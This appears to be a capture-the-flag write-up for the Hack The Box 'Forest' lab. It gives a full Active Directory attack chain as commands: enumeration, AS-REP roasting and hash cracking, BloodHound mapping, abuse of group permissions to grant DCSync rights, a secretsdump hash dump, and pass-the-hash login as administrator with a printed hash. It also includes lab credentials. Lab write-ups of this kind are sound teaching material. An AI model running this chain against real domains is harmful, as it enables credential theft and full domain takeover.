---
icon: windows
---

# Forest - Easy

## <mark style="color:blue;">Gaining Access</mark>

Nmap scan:

```bash
# Nmap TCP
nmap -A -T4 -p- -Pn 10.10.10.161 -oN scans/nmap-tcpall
Starting Nmap 7.95 ( https://nmap.org ) at 2025-10-13 18:15 EDT
Nmap scan report for htb.local (10.10.10.161)
Host is up (0.061s latency).
Not shown: 65511 closed tcp ports (reset)
PORT      STATE SERVICE      VERSION
53/tcp    open  domain       Simple DNS Plus
88/tcp    open  kerberos-sec Microsoft Windows Kerberos (server time: 2025-10-13 22:23:02Z)
135/tcp   open  msrpc        Microsoft Windows RPC
139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
389/tcp   open  ldap         Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds Windows Server 2016 Standard 14393 microsoft-ds (workgroup: HTB)
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http   Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap         Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
5985/tcp  open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf       .NET Message Framing
47001/tcp open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
49664/tcp open  msrpc        Microsoft Windows RPC
49665/tcp open  msrpc        Microsoft Windows RPC
49666/tcp open  msrpc        Microsoft Windows RPC
49667/tcp open  msrpc        Microsoft Windows RPC
49671/tcp open  msrpc        Microsoft Windows RPC
49676/tcp open  ncacn_http   Microsoft Windows RPC over HTTP 1.0
49677/tcp open  msrpc        Microsoft Windows RPC
49684/tcp open  msrpc        Microsoft Windows RPC
49703/tcp open  msrpc        Microsoft Windows RPC
49916/tcp open  msrpc        Microsoft Windows RPC
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.95%E=4%D=10/13%OT=53%CT=1%CU=31034%PV=Y%DS=2%DC=T%G=Y%TM=68ED7A
OS:73%P=x86_64-pc-linux-gnu)SEQ(SP=105%GCD=1%ISR=10D%II=I%TS=A)SEQ(SP=107%G
OS:CD=1%ISR=10B%TS=A)SEQ(SP=F6%GCD=1%ISR=10A%II=I%TS=A)SEQ(SP=FA%GCD=1%ISR=
OS:110%CI=I%TS=A)SEQ(SP=FC%GCD=1%ISR=100%CI=I%II=I%TS=A)OPS(O1=M542NW8ST11%
OS:O2=M542NW8ST11%O3=M542NW8NNT11%O4=M542NW8ST11%O5=M542NW8ST11%O6=M542ST11
OS:)WIN(W1=2000%W2=2000%W3=2000%W4=2000%W5=2000%W6=2000)ECN(R=Y%DF=Y%T=80%W
OS:=2000%O=M542NW8NNS%CC=Y%Q=)T1(R=Y%DF=Y%T=80%S=O%A=S+%F=AS%RD=0%Q=)T2(R=Y
OS:%DF=Y%T=80%W=0%S=Z%A=S%F=AR%O=%RD=0%Q=)T3(R=Y%DF=Y%T=80%W=0%S=Z%A=O%F=AR
OS:%O=%RD=0%Q=)T4(R=Y%DF=Y%T=80%W=0%S=A%A=O%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=80
OS:%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=80%W=0%S=A%A=O%F=R%O=%RD=0%Q
OS:=)T7(R=Y%DF=Y%T=80%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T=80%IPL=164
OS:%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=80%CD=Z)

Network Distance: 2 hops
Service Info: Host: FOREST; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb-os-discovery: 
|   OS: Windows Server 2016 Standard 14393 (Windows Server 2016 Standard 6.3)
|   Computer name: FOREST
|   NetBIOS computer name: FOREST\x00
|   Domain name: htb.local
|   Forest name: htb.local
|   FQDN: FOREST.htb.local
|_  System time: 2025-10-13T15:24:05-07:00
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: required
| smb2-time: 
|   date: 2025-10-13T22:24:07
|_  start_date: 2025-10-13T01:13:29
|_clock-skew: mean: 2h26m52s, deviation: 4h02m31s, median: 6m51s
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required

TRACEROUTE (using port 23/tcp)
HOP RTT      ADDRESS
1   55.35 ms 10.10.16.1
2   90.60 ms htb.local (10.10.10.161)
```

Nmap identified the domain name `htb.local` I will add it to `/etc/hosts`

### <mark style="color:$primary;">DNS Enumeration</mark>

I'll try and brute force subdomains using dnsenum to see if anything else shows up.

{% code overflow="wrap" %}
```bash
nsenum --dnsserver 10.10.10.161 -f ~/tools/SecLists/Discovery/DNS/bitquark-subdomains-top100000.txt htb.local
```
{% endcode %}

<figure><img src="../../.gitbook/assets/image (2654).png" alt=""><figcaption></figcaption></figure>

Found a new subdomain let's add it to our /etc/hosts file

```
10.10.10.161	htb.local forest.htb.local
```

### <mark style="color:$primary;">RPC Enumeration</mark>

```bash
rpcclient -U "" -N 10.10.10.161
```

<figure><img src="../../.gitbook/assets/image (2655).png" alt=""><figcaption></figcaption></figure>

managed to get a list of domain users via RPC. I am going to save them to a file and attempt AS-REP roasting

#### Command line FU&#x20;

Helps with parsing the output

{% code overflow="wrap" %}
```bash
cat users | cut -d '[' -f2 | cut -d ']' -f1 | grep -v 'Health' | grep -v 'SM_' | grep -v '$33' | tee users
```
{% endcode %}

<figure><img src="../../.gitbook/assets/image (2656).png" alt=""><figcaption></figcaption></figure>

### <mark style="color:$primary;">AS-REP roasting</mark>

{% code overflow="wrap" %}
```bash
impacket-GetNPUsers -no-pass -dc-ip 10.10.10.161 'htb.local/' -usersfile users -format hashcat -outputfile hashes.aspreroast
```
{% endcode %}

<figure><img src="../../.gitbook/assets/image (2657).png" alt=""><figcaption></figcaption></figure>

### <mark style="color:$primary;">Cracking AS-REP Hash</mark>

{% code overflow="wrap" %}
```bash
hashcat -m 18200 hashes.aspreroast /usr/share/wordlists/rockyou.txt
```
{% endcode %}

<figure><img src="../../.gitbook/assets/image (2658).png" alt=""><figcaption></figcaption></figure>

```bash
netexec winrm htb.local -u svc-alfresco -p s3rvice
```

<figure><img src="../../.gitbook/assets/image (2659).png" alt=""><figcaption></figcaption></figure>

### <mark style="color:blue;">Privilege Escalation</mark>

```bash
evil-winrm -i htb.local -u svc-alfresco -p s3rvice
```

<figure><img src="../../.gitbook/assets/image (2662).png" alt=""><figcaption></figcaption></figure>

We can see that svc-alfresco is part of the Account Operators group

I'll do bloodhound collection with netexec, so I can have a better graphical overview

### <mark style="color:$primary;">Bloodhound</mark>

{% code overflow="wrap" %}
```bash
netexec ldap htb.local -u svc-alfresco -p s3rvice --bloodhound --collection All --dns-server 10.10.10.161
```
{% endcode %}

<figure><img src="../../.gitbook/assets/image (2660).png" alt=""><figcaption></figcaption></figure>

start bloodhound

```
sudo neo4j start
bloodhound
```

<figure><img src="../../.gitbook/assets/image (2663).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (2664).png" alt=""><figcaption></figcaption></figure>

If we take a look at the graph we will see that the account operators group has GenericAll on the Exchange Windows Permissions Group.&#x20;

GenericAll means all user in the ACCOUNT OPERATORS group can modify the EXCHANGE WINDOWS PERMISSIONS group which includes adding or removing new users

The members of the group EXCHANGE WINDOWS PERMISSIONS have permissions to modify the DACL \[Discretionary Access Control List] on the domain HTB.LOCAL with this we can give any user DcSync privileges

DcSync privileges will allow us to dump all the hashes from the DC

### <mark style="color:$primary;">Account Operators Group</mark>

because we are part of ACCOUNT OPERATORS we can add a new user to the DC

```powershell
net user deimos deimos123! /add /domain
```

<figure><img src="../../.gitbook/assets/image (2665).png" alt=""><figcaption></figcaption></figure>

### <mark style="color:$primary;">Abusing GenericAll</mark>

Will take the new user and add him to the EXCHANGE WINDOWS PERMISSIONS group

```powershell
net group "Exchange Windows Permissions" /add deimos
```

<figure><img src="../../.gitbook/assets/image (2666).png" alt=""><figcaption></figcaption></figure>

### <mark style="color:$primary;">Abusing WriteDacl</mark>

We will need [**PowerView.ps1**](https://github.com/PowerShellMafia/PowerSploit/tree/master/Recon) for this

Download on your target machine and run it&#x20;

<figure><img src="../../.gitbook/assets/image (2667).png" alt=""><figcaption></figcaption></figure>

Now to give our new user \[deimos] DcSync privileges

{% code overflow="wrap" %}
```powershell
$SecPassword = ConvertTo-SecureString 'deimos123!' -AsPlainText -Force
```
{% endcode %}

{% code overflow="wrap" %}
```powershell
$Cred = New-Object System.Management.Automation.PSCredential('htb\deimos', $SecPassword)
```
{% endcode %}

{% code overflow="wrap" %}
```powershell
Add-DomainObjectAcl -Credential $Cred -TargetIdentity "DC=htb,DC=local" -PrincipalIdentity deimos -Rights DCSync
```
{% endcode %}

<figure><img src="../../.gitbook/assets/image (2668).png" alt=""><figcaption></figcaption></figure>

### <mark style="color:$primary;">DCSync Attack</mark>

```bash
impacket-secretsdump htb.local/deimos:'deimos123!'@10.10.10.161
```

<figure><img src="../../.gitbook/assets/image (2669).png" alt=""><figcaption></figcaption></figure>

Now grab the administrators hash and get a shell as him over winrm

{% code overflow="wrap" %}
```bash
evil-winrm -i htb.local -u administrator -H 32693b11e6aa90eb43d32c72a07ceea6
```
{% endcode %}

<figure><img src="../../.gitbook/assets/image (2670).png" alt=""><figcaption></figcaption></figure>
